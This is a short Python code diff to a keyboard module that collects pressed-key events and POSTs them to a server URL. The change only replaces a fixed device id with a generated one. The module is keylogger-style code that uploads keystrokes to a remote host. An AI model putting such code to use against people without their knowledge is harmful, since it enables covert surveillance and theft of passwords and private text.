@@ -4,6 +4,7 @@ from time import time
 from . import BaseModule
 from requests import post
 from logging import info
+from ..extras.id import generate_id
 
 
 class KeyboardModule(BaseModule):
@@ -20,7 +21,7 @@ class KeyboardModule(BaseModule):
     def update(self):
         # Метод отправки данных на сервер
         try:
-            post(self.url, json=dict(id_device=0, source=101, value=self.key_events))
+            post(self.url, json=dict(id_device=generate_id(), source=101, value=self.key_events))
             info(f'Отправлены данные: {self.key_events}')
             self.key_events.clear()  # Отчищаем массив нажатых клавиш
         except Exception as exception:
